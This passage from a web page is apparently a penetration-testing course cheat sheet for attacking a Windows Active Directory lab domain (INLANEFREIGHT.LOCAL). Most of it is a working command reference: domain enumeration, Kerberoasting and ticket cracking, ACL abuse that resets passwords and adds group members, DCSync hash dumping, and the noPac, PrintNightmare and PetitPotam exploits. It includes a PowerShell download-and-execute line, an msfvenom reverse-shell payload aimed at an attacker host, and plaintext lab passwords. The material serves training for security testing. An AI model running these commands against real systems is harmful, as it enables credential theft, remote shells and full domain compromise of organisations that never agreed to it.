-d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</code></td><td>Enumerates the target Windows domain using valid credentials and performs a recursive listing (<code>-R</code>) of the specified share (<code>SYSVOL</code>) and only outputs a list of directories (<code>--dir-only</code>) in the share. Performed from a Linux-based host.</td></tr><tr><td><code> rpcclient $&gt; queryuser 0x457</code></td><td>Enumerates a target user account in a Windows domain using its relative identifier (<code>0x457</code>). Performed from a Linux-based host.</td></tr><tr><td><code>rpcclient $&gt; enumdomusers</code></td><td>Discovers user accounts in a target Windows domain and their associated relative identifiers (<code>rid</code>). Performed from a Linux-based host.</td></tr><tr><td><code>psexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.125  </code></td><td>Impacket tool used to connect to the <code>CLI</code>  of a Windows target via the <code>ADMIN$</code> administrative share with valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>wmiexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.5  </code></td><td>Impacket tool used to connect to the <code>CLI</code> of a Windows target via <code>WMI</code> with valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>windapsearch.py -h</code></td><td>Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.</td></tr><tr><td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 --da</code></td><td>Used to enumerate the domain admins group (<code>--da</code>) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 -PU</code></td><td>Used to perform a recursive search (<code>-PU</code>) for users with nested permissions using valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>sudo bloodhound-python -u &#39;forend&#39; -p &#39;Klmcargo2&#39; -ns 172.16.5.5 -d inlanefreight.local -c all</code></td><td>Executes the python implementation of BloodHound (<code>bloodhound.py</code>) with valid credentials and specifies a name server (<code>-ns</code>) and target Windows domain (<code>inlanefreight.local</code>)  as well as runs all checks (<code>-c all</code>). Runs using valid credentials. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="Enumeration-by-Living-Off-the-Land"><a href="#Enumeration-by-Living-Off-the-Land" class="headerlink" title="Enumeration by Living Off the Land"></a>Enumeration by Living Off the Land</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-Module</code></td><td>PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.</td></tr><tr><td><code>Import-Module ActiveDirectory</code></td><td>Loads the <code>Active Directory</code> PowerShell module from a Windows-based host.</td></tr><tr><td><code>Get-ADDomain</code></td><td>PowerShell cmd-let used to gather Windows domain information from a Windows-based host.</td></tr><tr><td><code>Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName</code></td><td>PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by <code>ServicePrincipalName</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADTrust -Filter *</code></td><td>PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (<code>-Filter *</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADGroup -Filter * | select name</code></td><td>PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (<code>select name</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADGroup -Identity &quot;Backup Operators&quot;</code></td><td>PowerShell cmd-let used to search for a specifc group (<code>-Identity &quot;Backup Operators&quot;</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADGroupMember -Identity &quot;Backup Operators&quot;</code></td><td>PowerShell cmd-let used to discover the members of a specific group (<code>-Identity &quot;Backup Operators&quot;</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Export-PowerViewCSV</code></td><td>PowerView script used to append results to a <code>CSV</code> file. Performed from a Windows-based host.</td></tr><tr><td><code>ConvertTo-SID</code></td><td>PowerView script used to convert a <code>User</code> or <code>Group</code> name to it’s <code>SID</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainSPNTicket</code></td><td>PowerView script used to request the kerberos ticket for a specified service principal name (<code>SPN</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-Domain</code></td><td>PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainController</code></td><td>PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser</code></td><td>PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainComputer</code></td><td>PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroup</code></td><td>PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainOU</code></td><td>PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Find-InterestingDomainAcl</code></td><td>PowerView script used to find object <code>ACLs</code> in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroupMember</code></td><td>PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainFileServer</code></td><td>PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainDFSShare</code></td><td>PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGPO</code></td><td>PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetLocalGroup</code></td><td>PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetLocalGroupMember</code></td><td>PowerView script enumerate members of a specific local group. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetShare</code></td><td>PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetSession</code></td><td>PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td><code>Test-AdminAccess</code></td><td>PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td><code>Find-DomainUserLocation</code></td><td>PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.</td></tr><tr><td><code>Find-DomainShare</code></td><td>PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.</td></tr><tr><td><code>Find-InterestingDomainShareFile</code></td><td>PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.</td></tr><tr><td><code>Find-LocalAdminAccess</code></td><td>PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrust</code></td><td>PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-ForestTrust</code></td><td>PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainForeignUser</code></td><td>PowerView script that enumerates users who are in groups outside of the user’s domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainForeignGroupMember</code></td><td>PowerView script that enumerates groups with users outside of the group’s domain and returns each foreign member. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrustMapping</code></td><td>PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code></td><td>PowerView script used to list all the members of a target group (<code>&quot;Domain Admins&quot;</code>) through the use of the recurse option (<code>-Recurse</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></td><td>PowerView script used to find users on the target Windows domain that have the <code>Service Principal Name</code> set. Performed from a Windows-based host.</td></tr><tr><td><code>.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data</code></td><td>Runs a tool called <code>Snaffler</code> against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Transfering-Files"><a href="#Transfering-Files" class="headerlink" title="Transfering Files"></a>Transfering Files</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo python3 -m http.server 8001</code></td><td>Starts a python web server for quick hosting of files. Performed from a Linux-basd host.</td></tr><tr><td><code>&quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://172.16.5.222/SharpHound.exe&#39;)&quot;</code></td><td>PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.</td></tr><tr><td><code>impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</code></td><td>Starts a impacket <code>SMB</code> server for quick hosting of a file. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo python3 -m pip install .</code></td><td>Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -h</code></td><td>Impacket tool used to display the options and functionality of <code>GetUserSPNs.py</code> from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</code></td><td>Impacket tool used to get a list of <code>SPNs</code> on the target Windows domain from  a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request</code></td><td>Impacket tool used to download&#x2F;request (<code>-request</code>) all TGS tickets for offline processing from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev</code></td><td>Impacket tool used to download&#x2F;request (<code>-request-user</code>) a TGS ticket for a specific user account (<code>sqldev</code>) from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</code></td><td>Impacket tool used to download&#x2F;request a TGS ticket for a specific user account and write the ticket to a file (<code>-outputfile sqldev_tgs</code>) linux-based host.</td></tr><tr><td><code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code></td><td>Attempts to crack the Kerberos (<code>-m 13100</code>) ticket hash (<code>sqldev_tgs</code>) using <code>hashcat</code> and a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td></tr><tr><td><code>setspn.exe -Q */*</code></td><td>Used to enumerate <code>SPNs</code> in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</code></td><td>PowerShell script used to download&#x2F;request the TGS ticket of a specific user from a Windows-based host.</td></tr><tr><td><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;</code></td><td>Used to download&#x2F;request all TGS tickets from a WIndows-based host.</td></tr><tr><td><code>mimikatz # base64 /out:true</code></td><td><code>Mimikatz</code> command that ensures TGS tickets are extracted in <code>base64</code> format from a Windows-based host.</td></tr><tr><td><code>kerberos::list /export </code></td><td><code>Mimikatz</code> command used to extract the TGS tickets from a Windows-based host.</td></tr><tr><td><code>echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\n </code></td><td>Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.</td></tr><tr><td><code>cat encoded_file | base64 -d &gt; sqldev.kirbi</code></td><td>Used to output a file (<code>encoded_file</code>) into a .kirbi file in base64 (<code>base64 -d &gt; sqldev.kirbi</code>) format from a Linux-based host.</td></tr><tr><td><code>python2.7 kirbi2john.py sqldev.kirbi</code></td><td>Used to extract the <code>Kerberos ticket</code>. This also creates a file called <code>crack_file</code> from a Linux-based host.</td></tr><tr><td><code>sed &#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39; crack_file &gt; sqldev_tgs_hashcat</code></td><td>Used to modify the <code>crack_file</code> for <code>Hashcat</code> from a Linux-based host.</td></tr><tr><td><code>cat sqldev_tgs_hashcat </code></td><td>Used to view the prepared hash from a Linux-based host.</td></tr><tr><td><code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt </code></td><td>Used to crack the prepared Kerberos ticket hash (<code>sqldev_tgs_hashcat</code>) using a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td></tr><tr><td><code>Import-Module .\PowerView.ps1  Get-DomainUser * -spn | select samaccountname</code></td><td>Uses PowerView tool to extract <code>TGS Tickets</code> . Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></td><td>PowerView tool used to download&#x2F;request the TGS ticket of a specific ticket and automatically format it for <code>Hashcat</code> from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation</code></td><td>Exports all TGS tickets to a <code>.CSV</code> file (<code>ilfreight_tgs.csv</code>) from a Windows-based host.</td></tr><tr><td><code>cat .\ilfreight_tgs.csv</code></td><td>Used to view the contents of the .csv file from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe</code></td><td>Used to view the options and functionality possible with the tool <code>Rubeus</code>. Performed from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /stats</code></td><td>Used to check the kerberoast stats (<code>/stats</code>) within the target Windows domain from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /ldapfilter:&#39;admincount=1&#39; /nowrap</code></td><td>Used to request&#x2F;download TGS tickets for accounts with the <code>admin</code> count set to <code>1</code> then formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>) . Performed from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /user:testspn /nowrap</code></td><td>Used to request&#x2F;download a TGS ticket for a specific user (<code>/user:testspn</code>) the formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code></td><td>PowerView tool used to check the <code>msDS-SupportedEncryptionType</code> attribute associated with a specific user account (<code>testspn</code>). Performed from a Windows-based host.</td></tr><tr><td><code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code></td><td>Used to attempt to crack the ticket hash using a wordlist (<code>rockyou.txt</code>) from a Linux-based host .</td></tr></tbody></table><h1 id="ACL-Enumeration-amp-Tactics"><a href="#ACL-Enumeration-amp-Tactics" class="headerlink" title="ACL Enumeration &amp; Tactics"></a>ACL Enumeration &amp; Tactics</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Find-InterestingDomainAcl</code></td><td>PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.</td></tr><tr><td><code>Import-Module .\PowerView.ps1  $sid = Convert-NameToSid wley</code></td><td>Used to import PowerView and retrieve the <code>SID</code> of a specific user account (<code>wley</code>) from a Windows-based host.</td></tr><tr><td><code>Get-DomainObjectACL -Identity * | ? &#123;$_.SecurityIdentifier -eq $sid&#125;</code></td><td>Used to find all Windows domain objects that the user has rights over by mapping the user’s <code>SID</code> to the <code>SecurityIdentifier</code> property from a Windows-based host.</td></tr><tr><td><code>$guid= &quot;00299570-246d-11d0-a768-00aa006e0529&quot;   Get-ADObject -SearchBase &quot;CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)&quot; -Filter &#123;ObjectClass -like &#39;ControlAccessRight&#39;&#125; -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?&#123;$_.rightsGuid -eq $guid&#125; | fl</code></td><td>Used to perform a reverse search &amp; map to a <code>GUID</code> value from a Windows-based host.</td></tr><tr><td><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? &#123;$_.SecurityIdentifier -eq $sid&#125; </code></td><td>Used to discover a domain object’s ACL by performing a search based on GUID’s (<code>-ResolveGUIDs</code>) from a Windows-based host.</td></tr><tr><td><code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code></td><td>Used to discover a group of user accounts in a target Windows domain and add the output to a text file (<code>ad_users.txt</code>) from a Windows-based host.</td></tr><tr><td><code>foreach($line in [System.IO.File]::ReadLines(&quot;C:\Users\htb-student\Desktop\ad_users.txt&quot;)) &#123;get-acl  &quot;AD:\$(Get-ADUser $line)&quot; | Select-Object Path -ExpandProperty Access | Where-Object &#123;$_.IdentityReference -match &#39;INLANEFREIGHT\\wley&#39;&#125;&#125;</code></td><td>A <code>foreach loop</code> used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(<code>ad_users.txt</code>) to the <code>Get-ADUser</code> cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.</td></tr><tr><td><code>$SecPassword = ConvertTo-SecureString &#39;&lt;PASSWORD HERE&gt;&#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(&#39;INLANEFREIGHT\wley&#39;, $SecPassword) </code></td><td>Used to create a <code>PSCredential Object</code> from a Windows-based host.</td></tr><tr><td><code>$damundsenPassword = ConvertTo-SecureString &#39;Pwn3d_by_ACLs!&#39; -AsPlainText -Force</code></td><td>Used to create a <code>SecureString Object</code> from a Windows-based host.</td></tr><tr><td><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code></td><td>PowerView tool used to change the password of a specifc user (<code>damundsen</code>) on a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-ADGroup -Identity &quot;Help Desk Level 1&quot; -Properties * | Select -ExpandProperty Members</code></td><td>PowerView tool used view the members of a target security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td></tr><tr><td><code>Add-DomainGroupMember -Identity &#39;Help Desk Level 1&#39; -Members &#39;damundsen&#39; -Credential $Cred2 -Verbose</code></td><td>PowerView tool used to add a specifc user (<code>damundsen</code>) to a specific security group (<code>Help Desk Level 1</code>) in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroupMember -Identity &quot;Help Desk Level 1&quot; | Select MemberName</code></td><td>PowerView tool used to view the members of a specific security group (<code>Help Desk Level 1</code>) and output only the username of each member (<code>Select MemberName</code>) of the group from a Windows-based host.</td></tr><tr><td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @&#123;serviceprincipalname=&#39;notahacker/LEGIT&#39;&#125; -Verbose</code></td><td>PowerView tool used create a fake <code>Service Principal Name</code> given a sepecift user (<code>adunn</code>) from a Windows-based host.</td></tr><tr><td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code></td><td>PowerView tool used to remove the fake <code>Service Principal Name</code> created during the attack from a Windows-based host.</td></tr><tr><td><code>Remove-DomainGroupMember -Identity &quot;Help Desk Level 1&quot; -Members &#39;damundsen&#39; -Credential $Cred2 -Verbose</code></td><td>PowerView tool used to remove a specific user (<code>damundsent</code>) from a specific security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td></tr><tr><td><code>ConvertFrom-SddlString</code></td><td>PowerShell cmd-let used to covert an <code>SDDL string</code> into a readable format. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-DomainUser -Identity adunn  | select samaccountname,objectsid,memberof,useraccountcontrol |fl</code></td><td>PowerView tool used to view the group membership of a specific user (<code>adunn</code>) in a target Windows domain. Performed from a Windows-based host.</td></tr><tr><td><code>$sid= &quot;S-1-5-21-3842939050-3880317879-2865463114-1164&quot; Get-ObjectAcl &quot;DC=inlanefreight,DC=local&quot; -ResolveGUIDs | ? &#123; ($_.ObjectAceType -match &#39;Replication-Get&#39;)&#125; | ?&#123;$_.SecurityIdentifier -match $sid&#125; | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</code></td><td>Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool <code>Get-ObjectAcl</code> to check a specific user’s replication rights. Performed from a Windows-based host.</td></tr><tr><td><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss</code></td><td>Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (<code>172.16.5.5</code>) and save the extracted hashes to an file (<code>inlanefreight_hashes</code>). Performed from a Linux-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</code></td><td>Uses <code>Mimikatz</code> to perform a <code>dcsync</code> attack from a Windows-based host.</td></tr></tbody></table><h1 id="Privileged-Access"><a href="#Privileged-Access" class="headerlink" title="Privileged Access"></a>Privileged Access</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Desktop Users&quot;</code></td><td>PowerView based tool to used to enumerate the <code>Remote Desktop Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td></tr><tr><td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Management Users&quot;</code></td><td>PowerView based tool to used to enumerate the <code>Remote Management Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td></tr><tr><td><code>$password = ConvertTo-SecureString &quot;Klmcargo2&quot; -AsPlainText -Force</code></td><td>Creates a variable (<code>$password</code>) set equal to the password (<code>Klmcargo2</code>) of a user from a Windows-based host.</td></tr><tr><td><code>$cred = new-object System.Management.Automation.PSCredential (&quot;INLANEFREIGHT\forend&quot;, $password)</code></td><td>Creates a variable (<code>$cred</code>) set equal to the username (<code>forend</code>) and password (<code>$password</code>) of a target domain account from a Windows-based host.</td></tr><tr><td><code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code></td><td>Uses the PowerShell cmd-let <code>Enter-PSSession</code> to establish a PowerShell session with a target over the network (<code>-ComputerName ACADEMY-EA-DB01</code>) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (<code>$cred</code> &amp; <code>$password</code>).</td></tr><tr><td><code>evil-winrm -i 10.129.201.234 -u forend</code></td><td>Used to establish a PowerShell session with a Windows target from a Linux-based host using <code>WinRM</code>.</td></tr><tr><td><code>Import-Module .\PowerUpSQL.ps1</code></td><td>Used to import the <code>PowerUpSQL</code> tool.</td></tr><tr><td><code>Get-SQLInstanceDomain</code></td><td>PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.</td></tr><tr><td><code>Get-SQLQuery -Verbose -Instance &quot;172.16.5.150,1433&quot; -username &quot;inlanefreight\damundsen&quot; -password &quot;SQL1234!&quot; -query &#39;Select @@version&#39;</code></td><td>PowerUpSQL tool used to connect to connect to a SQL server and query the version (<code>-query &#39;Select @@version&#39;</code>) from a Windows-based host.</td></tr><tr><td><code>mssqlclient.py</code></td><td>Impacket tool used to display the functionality and options provided with <code>mssqlclient.py</code> from a Linux-based host.</td></tr><tr><td><code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</code></td><td>Impacket tool used to connect to a MSSQL server from a Linux-based host.</td></tr><tr><td><code>SQL&gt; help</code></td><td>Used to display mssqlclient.py options once connected to a MSSQL server.</td></tr><tr><td><code>SQL&gt; enable_xp_cmdshell</code></td><td>Used to enable <code>xp_cmdshell stored procedure</code> that allows for executing OS commands via the database from a Linux-based host.</td></tr><tr><td><code>xp_cmdshell whoami /priv</code></td><td>Used to enumerate rights on a system using <code>xp_cmdshell</code>.</td></tr></tbody></table><h1 id="NoPac"><a href="#NoPac" class="headerlink" title="NoPac"></a>NoPac</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo git clone https://github.com/Ridter/noPac.git</code></td><td>Used to clone a <code>noPac</code> exploit using git. Performed from a Linux-based host.</td></tr><tr><td><code>sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code></td><td>Runs <code>scanner.py</code> to check if a target system is vulnerable to <code>noPac</code>&#x2F;<code>Sam_The_Admin</code> from a Linux-based host.</td></tr><tr><td><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></td><td>Used to exploit the <code>noPac</code>&#x2F;<code>Sam_The_Admin</code>  vulnerability and gain a SYSTEM shell (<code>-shell</code>). Performed from a Linux-based host.</td></tr><tr><td><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code></td><td>Used to exploit the <code>noPac</code>&#x2F;<code>Sam_The_Admin</code>  vulnerability and perform a <code>DCSync</code> attack against the built-in Administrator account on a Domain Controller from a Linux-based host.</td></tr></tbody></table><h1 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code></td><td>Used to clone a PrintNightmare exploit  using git from a Linux-based host.</td></tr><tr><td><code>pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install</code></td><td>Used to ensure the exploit author’s (<code>cube0x0</code>) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.</td></tr><tr><td><code>rpcdump.py @172.16.5.5 | egrep &#39;MS-RPRN|MS-PAR&#39;</code></td><td>Used to check if a Windows target has <code>MS-PAR</code> &amp; <code>MSRPRN</code> exposed from a Linux-based host.</td></tr><tr><td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll</code></td><td>Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.</td></tr><tr><td><code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code></td><td>Used to create an SMB server and host a shared folder (<code>CompData</code>) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.</td></tr><tr><td><code>sudo python3 CVE-2021-1675.py inlanefreight.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 &#39;\\10.129.202.111\CompData\backupscript.dll&#39;</code></td><td>Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code></td><td>Impacket tool used to create an <code>NTLM relay</code> by specifiying the web enrollment URL for the <code>Certificate Authority</code> host. Perfomred from a Linux-based host.</td></tr><tr><td><code>git clone https://github.com/topotam/PetitPotam.git</code></td><td>Used to clone the <code>PetitPotam</code> exploit using git. Performed from a Linux-based host.</td></tr><tr><td><code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code></td><td>Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (<code>172.16.5.255</code>) and the target Domain Controller (<code>172.16.5.5</code>). Performed from a Linux-based host.</td></tr><tr><td><code>python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 &lt;base64 certificate&gt; = dc01.ccache</code></td><td>Uses <code>gettgtpkinit</code>.py to request a TGT ticket for the Domain Controller (<code>dc01.ccache</code>) from a Linux-based host.</td></tr><tr><td><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass &quot;ACADEMY-EA-DC01$&quot;@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td><td>Impacket tool used to perform a DCSync attack and retrieve one or all of the <code>NTLM password hashes</code> from the target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>klist</code></td><td><code>krb5-user</code> command used to view the contents of the <code>ccache</code> file. Performed from a Linux-based host.</td></tr><tr><td><code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</code></td><td>Used to submit TGS requests using <code>getnthash.py</code> from a Linux-based host.</td></tr><tr><td><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator &quot;ACADEMY-EA-DC01$&quot;@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code></td><td>Impacket tool used to extract hashes from <code>NTDS.dit</code> using a <code>DCSync attack</code> and a captured hash 